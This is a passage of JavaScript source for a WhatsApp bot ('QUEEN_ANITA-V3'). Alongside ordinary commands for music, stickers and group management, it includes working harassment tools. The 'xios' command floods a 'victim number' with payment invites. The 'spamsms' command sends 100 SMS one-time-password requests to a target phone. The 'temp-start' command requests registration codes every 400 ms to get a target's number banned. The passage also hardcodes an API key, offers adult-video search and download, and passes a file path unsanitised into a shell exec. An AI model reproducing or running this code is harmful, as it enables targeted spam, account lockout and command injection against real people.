        .catch(() => reply('Could not find the definition. Please check the word and try again.'));
    break;
 
  case 'play': {
  if (!text) return reply('Example: Play Faded by Alan Walker');
  try {
    // Search for the song on YouTube
    let res = await yts(text);
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)];

    let teks = `_*Playing  ${result.title}..._*`;

    // React with a musical note emoji
    await ptz.sendMessage(m?.chat, {react: {text: `🎵`, key: m?.key}});

    // Send the image and caption
    await ptz.sendMessage(m.chat, { 
      image: { url: result.thumbnail },  
      caption: teks 
    }, { quoted: m });

    // Fetch audio data from the provided API
    let data = await (await fetch(`https://api.agatz.xyz/api/ytmp3?url=${result.url}`)).json();
    
    // Correctly access the 'download' property inside 'data'
    if (data.data && data.data.download) {
      let audioUrl = data.data.download;

      // Send the audio file
      await ptz.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mp4', 
      }, { quoted: m });
    } else {
      // Handle the case where audio URL is not available
      reply('Error! Audio download URL not found in the response.');
    }
  } catch (error) {
    // Log the error for better debugging
    console.error(error);
    reply('`Error! `');
  }
}
break;



 case 'setppgc': {
if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`)   
let media = await ptz.downloadAndSaveMediaMessage(quoted)
await ptz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply("Success Updating Group Photo")
}
break

case 'delppgc': {
if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`)   
await ptz.removeProfilePicture(from)
await reply(`Success Deleting Group Photo`)
}
break

case 'getnamegc': {
if (!m.isGroup) return (`For Group Only`)  

if (!isBotAdmins) return (`Bot Must Be Admin`)   
reply(`${groupMetadata.subject}`)
}
break

case 'getdeskgc': {
if (!m.isGroup) return (`For Group Only`)  

if (!isBotAdmins) return (`Bot Must Be Admin`)   
reply(`${groupMetadata.desc}`)
}
break



case 'getppgc': {
if (!m.isGroup) return (`For Group Only`) 
try {
avatar = await ptz.profilePictureUrl(m.chat, "image")
} catch {
avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
ptz.sendMessage(m.chat, {image: {url: avatar }, caption: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™` }, {quoted: m })
}
break

case 'getname': {
if (!m.isGroup) return onlyGrup()
if (m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let nama = ptz.getName(users)
reply(nama)
} else reply('Tag someone message / Tag Somone!')
}
break



case 'hd':
case 'remini':{
  
  if (!quoted) return reply(`*ERROR!!  Example :*\n> *Reply A Picture with the Caption .hd*`)
  if (!/image/.test(mime)) return reply(`*ERROR!!  Example :*\n> *Reply A Picture with the Caption .hd*`)
  let media = await ptz.downloadAndSaveMediaMessage(quoted);
  let shz = await shannzCdn(media);
  let cdn = shz.result.url;
  let proses = await (await fetch('https://api.shannmoderz.xyz/tools/enhace?url=' + cdn)).json();
  let imge = proses.result.data;
  ptz.sendMessage(m.chat, { image: { url: imge.downloadUrls[0] }, caption: '*SUCCESS ✅*'}, { quoted: m})
 } 
break

case 'antilink': {
if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`)  
if (args[0] === "on") {
if (isAntiLink) return reply(`Already active before`)
nplink.push(m.chat)
fs.writeFileSync('./database/antilinkall.json ', JSON.stringify(nplink, null, 2))
reply('Successfully activated antilink!')
} else if (args[0] === "off") {
if (!isAntiLink) return reply(`Previously inactive`)
let anu = nplink.indexOf(m.chat)
nplink.splice(anu, 1)
fs.writeFileSync('./database/antilinkall.json ', JSON.stringify(nplink, null, 2))
reply('Success in disabling antink!')
} else {
reply(`Example: ${prefix+command} on/off`)
}}
break



// Command to enable/disable AntiLink Warn
// Command to enable/disable AntiLink Warn
case 'antilinkwarn': {
    if (!m.isGroup) return reply(`This command is for groups only.`);
    if (!isAdmins) return reply(`This command is for group admins only.`);
    if (!isBotAdmins) return reply(`Bot needs to be admin to execute this command.`);

    if (args[0] === "on") {
        if (isAntiLinkwarn) return reply(`AntiLink Warn is already active.`);
        nplinkwarn.push(m.chat);
        fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(nplinkwarn, null, 2));
        reply('Successfully activated AntiLink Warn!');
    } else if (args[0] === "off") {
        if (!isAntiLinkwarn) return reply(`AntiLink Warn is already inactive.`);
        let anu = nplinkwarn.indexOf(m.chat);
        nplinkwarn.splice(anu, 1);
        fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(nplinkwarn, null, 2));
        reply('Successfully disabled AntiLink Warn!');
    } else {
        reply(`Usage: ${prefix + command} on/off`);
    }
}
break;

// Command to enable/disable AntiLink Kick
case 'antilinkkick': {
    if (!m.isGroup) return reply(`This command is for groups only.`);
    if (!isAdmins) return reply(`This command is for group admins only.`);
    if (!isBotAdmins) return reply(`Bot needs to be admin to execute this command.`);

    if (args[0] === "on") {
        if (isAntiLinkremove) return reply(`AntiLink Kick is already active.`);
        nplinkgc.push(m.chat);
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(nplinkgc, null, 2));
        reply('Successfully activated AntiLink Kick!');
    } else if (args[0] === "off") {
        if (!isAntiLinkremove) return reply(`AntiLink Kick is already inactive.`);
        let anu = nplinkgc.indexOf(m.chat);
        nplink.splice(anu, 1);
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(nplink, null, 2));
        reply('Successfully disabled AntiLink Kick!');
    } else {
        reply(`Usage: ${ prefix + command} on/off`);
    }
}
break;

case 'xxxdownload': {
    let url = global.db.data.users[m.sender].lastXVideoUrl || text;
    if (!url) return reply('No video URL found. Please search for a video using *xvidsearch* or provide a valid URL.');

    try {
        // Call the download API with the video URL
        let apiUrl = `https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(url)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200) {
            let videoUrl = result.data.url;
            let body = `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™*`;

            // Send the video file directly
            ptz.sendMessage(m.chat, { video: { url: videoUrl }, caption: body }, { quoted: m });
        } else {
            reply('Failed to fetch the video.');
        }
    } catch (error) {
        reply('Error fetching the video. Please try again.');
    }
}
break;

case 'xxxsearch': {
    if (!text) return reply(`Please provide a search query. Example: ${prefix + command} sister`);

    try {
        // Call the search API with the search keyword
        let apiUrl = `https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200) {
            // Prepare the search result
            let videoInfo = result.data[0]; // Assuming the first result is desired
            let body = `*XVideo Search Result:*
> Title: *${videoInfo.title}*
> Views: *${videoInfo.views}*
> Duration: *${videoInfo.duration}*
> URL: *${videoInfo.url}*`;

            ptz.sendMessage(m.chat, { image: { url: videoInfo.thumb }, caption: body }, { quoted: m });

            // Store the video URL for later downloading
            global.db.data.users[m.sender].lastXVideoUrl = videoInfo.url;
        } else {
            reply('Failed to fetch search results.');
        }
    } catch (error) {
        reply('Error fetching search results. Please try again.');
    }
}
break;
 
 



case 'lockotp': case 'otplock': {
await ptz.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}}) 
await ptz.sendMessage(m?.chat, {text: '`This Command Is for Premuim Users Only`\n\n> Type *.premuim* To Become A Premium User',key: m?.key,}) 
await ptz.sendMessage(m?.chat, {react: {text: `❌`,key: m?.key,}}) 
}
break; 

case 'antibug': case 'antivirtex': {
await ptz.sendMessage(m?.chat, {react: {text: `🔍`,key: m?.key,}}) 
await ptz.sendMessage(m?.chat, {text: '`Checking Database.....`',key: m?.key,})  
await ptz.sendMessage(m?.chat, {text: '`This Command Is for Premuim Users Only`\n\n> Type *.premuim* To Become A Premium User And Get Protection Againt WhatsApp Bugs',key: m?.key,}) 
await ptz.sendMessage(m?.chat, {react: {text: `❌`,key: m?.key,}}) 
}
break; 

case 'sudo': {
if (!isOwner) return onlyOwn()
if (!args[0]) return reply(`Example: ${prefix+command} tag/quote`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
own.push(users)
fs.writeFileSync('./database/owner.json', JSON.stringify(own))
reply(`Succesfully Added User As Temporary Owner`)
}
break

case 'delsudo': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return reply(`Example: ${prefix+command} tag/quote`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.split("|")[0].replace(/[^0-9]/g, '')
own.splice(users, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(own))
reply(`Succesfully Removed User As Temporary Owner`)
}
break 

case 'buypremium': case 'premium': {
await ptz.sendMessage(m?.chat, {react: {text: `🔥`,key: m?.key,}}) 
await ptz.sendMessage(m?.chat, {text: '`Wanna Buy Premuim? Message Me On Telegram To Get Full Access & Become A Premuim User`\n\n 👉  t.me/deecee_x  👈',key: m?.key,}) 
}
break;  


case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await ptz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	    
	    
	    

case 'apk':
  if (!text) return reply('*Enter the name of the application you want to download?*')
  await ptz.sendMessage(m?.chat, {react: {text: ` 🔎`,key: m?.key,}})
  await ptz.sendMessage(m?.chat, {react: {text: `📥`,key: m?.key,}})
  try {
    await loading() 
  let apk = await (await fetch('https://api.neoxr.eu/api/apkpure?q=' + text)).json();
  let app = apk.result;
  ptz.sendMessage(m.chat, { document: { url: download.url }, fileName: download.name + '.apk', mimetype: 'application/xapk',
  caption: `*Developers Are :* ${download.developer}`}, { quoted: m })
  await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
} catch (e) {
    reply('* error :* ' + e)
}
break

/*
FITUR CREATED BY SELL
WALAU CUMA NGEGABUNGIN AJA
SORRY MASIH PEMULA:>
*`SUMBER`*

*/


case 'audio': {
if (!m.quoted) return reply('Reply Message');
let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
if (!urls) return reply('Maybe the message you replied to doesnt contain a YouTube URL');
let urlIndex = parseInt(text) - 1;
if (urlIndex < 0 || urlIndex >= urls.length) 
return reply('Invalid URL index');
await downloadMp3(urls);
}
break           

case 'joke':
    axios.get('https://official-joke-api.appspot.com/random_joke')
        .then(response => {
            const joke = response.data;
            reply(`${joke.setup} - ${joke.punchline}`);
        })
        .catch(() => reply('Could not fetch a joke at the moment. Please try again later.'));
    break;

case "xios": {
  
  
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234906652xxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234906652xxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await ptz.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "234906652xxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  ptz.sendMessage(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break; 

case 'obfus': 
case 'enc':
case 'obfuscate': 
case 'encrypt':{
if (!q) return reply(`Example ${prefix+command} const mitah = require('axios')`)
async function obfus(query) {
    const jsobfus = require('javascript-obfuscator')
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `zio`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

let meg = await obfus(q)
reply(`${meg.result}`)
}
break  

 


case 'pinchat': {
if (!isCreator) return isOwner()
ptz.chatModify({ pin: true }, m.chat)
await ptz.sendMessage(m?.chat, {react: {text: `📌`,key: m?.key,}})
}
break
case 'unpinchat': {
if (!isCreator) return isOwner()
ptz.chatModify({ pin: false }, m.chat)
await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}}) 
}
break




 case 'request': 
 case 'report':
 case 'reportbug': {
	if (!text) return reply(`Example : ${
        prefix + command
      } Hi David, play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hi ${pushname}, Your request has been forwarded to my Owner*.\n*Please wait......*`
            for (let i of owner) {
ptz.sendMessage(i + "2347043759577@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
},
 {
quoted: m,
})
            }
            await ptz.sendMessage(m?.chat, {react: {text: `📬`,key: m?.key,}}) 
            ptz.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break 
        
        case 'hack':
    if (!q) return reply('Please mention a user to hack!');

    reply('🕵️‍♂️ Initiating hack sequence...');
    await sleep(2000);  // Fake delay to simulate hacking

    reply('🔍 Searching for vulnerabilities...');
    await sleep(3000);

    reply('💻 Breaching firewalls...');
    await sleep(4000);

    const hackResult = `⚠️ *HACK SUCCESSFUL!* ⚠️\n\nUser Data Compromised: \nName: ${pushname}\nPhone Number: ${m.sender.split('@')[0]}\nPassword: ********`;
    reply(hackResult);
    break;

        

case 'mediafire': {
	if (args.length == 0) return reply(`Dimana linknya?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
ptz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break 
        
        
   case 'spamsms': {
if (!isCreator) return reply(`For.My.Owner Only`)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Start the number with +234')
if (froms == owner) return reply('Cannot spam this number!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS WA MODS`);
});
}
} else reply(`Use of spamsms target number/reply message*\nExample of spamsms ++2347047115448`)
reply(`spam sms/call will be sent to target number`)
}
break 
        
        case 'luckyday':
case 'luckytime':{
      if (!isUserRegistered(ckusrjoin)) return reply('_`*\n\n_');
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(m.sender, b, balance)
addLevelingXp(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
reply(`
•• *${m2}-[ Lucky Day ]-${m2}* ••\n
┊ *Money:* ${b}\n
┊ *Gold :* ${a}\n
┊ *Iron :* ${c}\n
┊ *XP :* ${ez}`)
}
break



        // === //

case "smartcontract": case "smart":
   let isuragg = await fetchJson(`https://api.hyuunewbie.my.id/api/smartcontract?message=${text}`)
let guaaa = isuragg.data.response
reply(guaaa)   
        break

case 'join': {
if (!isCreator) return reply('`This Command Is For Owner Only`')
if (!text) return reply(`Example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ptz.groupAcceptInvite(result)
await reply('`Done!`')
}
break 

case 'fliptext': {
if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${pushname}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break 

 case 'alive':
 case 'bot': {
  const msgai = `Hi. i am Queen Anita Multi device WhatsApp bot Created by David`
  const musicFilePath = './anita-sounds/menu.mp3';
await ptz.sendMessage(m.chat, {
      audio: { url: musicFilePath },
        mimetype: 'audio/mp4',  // Proper MIME type for audio
      ptt: true
    }, { quoted: m });
}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('./lib/uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
//const name = await VarelTzy.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return reply(`Where is the video?`);
await ptz.sendMessage(m?.chat, {react: {text: `🔄`,key: m?.key,}})
await loading();
const media = await ptz.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  ptz.sendMessage(m.chat, { caption: ``, video: { url: output }}, {quoted: m});
})
await sleep(100)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break 

case 'soulmate': {
            if (!m.isGroup) return reply('This Command Is For Groups Only') 
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '`ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./david-media/anita-pics/soulmate.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '', 
                  newsletterName: '', 
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply('This Command Is For Groups Only') 
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nSeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '`ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./david-media/anita-pics/couple.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '', 
                  newsletterName: '', 
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break



 
case 'temp-start': {
if (!isCreator) return
if (!text) return reply(`Example: ${prefix + command} 234|7043759577`)
if (!/|/.test(text)) return reply(`Example: ${prefix + command} 234|7043759577`)
let numbers = JSON.parse(fs.readFileSync('./system/Tempor.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Success\n\nQUEEN_ANITA-V3 Attack the number If you want to stop the temporary ban, type .temp-stop Please check the number: ${fullNo}`)
let { state, saveCreds } = await useMultiFileAuthState('session3')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./system/Tempor.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break  
        case "qanita-scan":
        if (!isCreator) return reply("*`Especially for my owner sir`*")  
     if (m.isGroup) return reply("Sorry sir this feature can only be used in person chat personally")  
        await jadibots(ptz, m, frommeky)
        break
    case "xxc":
      ptz.sendMessage(m.sender, {text:'x'}, {quoted:fsaluran})
            if (frommeky.includes('-')) {
console.log('Message received from group');
            }
       break
       

case "ngl": {
if (!text.split("|")[0] && !text.split("|")[1]) return reply("Enter your username and message!\nExample: .ngl davidcyril1|hello")
try {
let x = text.split("|")
var { data } = await require("axios")({
  "method": "GET",
  "url": "https://itzpire.com/tools/ngl?username=" + x[0] + "&message=" + x[1]
})
reply("Succefully Sent NgL To  " + x[0])
} catch (e) {
return reply("fitur error")
}
}
break       

    case "anita-pairing":
        if (!isCreator) return reply("*`Especially for my owner sir`*")
  if (!text) return reply("*Hi ! Like this: .anita-pairing 234xxx*\nExample: .anita-pairing 2347043759577")
await jadibot(ptz, text, m, frommeky)
            let furry = "`"
            await sleep(4800)
let jadibo = `*${furry}Enter the code below to be a temporary bot${furry}*\n\n1. Click point three in the upper right corner\n2. Tap the device\n3. Tap the device\n4. Tap it with the phone number only\n5. Enter the code below\n\nNote: Code can expire at any time!\n\nCode: ${furry}${global.codepairing}${furry}\nIf the code error please delete the session folder2\n\nClick the Pairing Code Button to copy the code`
let onlyprivjdb = '*Success !*'



let tekss9999 = jadibo;

let msghhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9999
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `David Cyril`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"${global.codepairing}","id":"123456789","copy_code":"${global.codepairing}"}`
     },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(`${text}@s.whatsapp.net`, msghhhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhhh.key.id
});

setTimeout(async () => {
    reply(onlyprivjdb)
}, 1200)
        console.log('Jadibot •••')
        break
     case 'hd': case 'remini2': {  if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
            let proses2 = proses
	 let hade = await remini(proses2, "enhance")
              
              
     ptz.sendMessage(m.chat, { image: hade, caption: '*Success*\n`QUEEN_ANITA-V3`'}, { quoted:fsaluran})
			}
			break  
			
case 'readmore': {
	let [r, l] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    ptz.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;			

case 'rate': {
            	if (!text) return reply(`Example : ${prefix + command} my profile`)
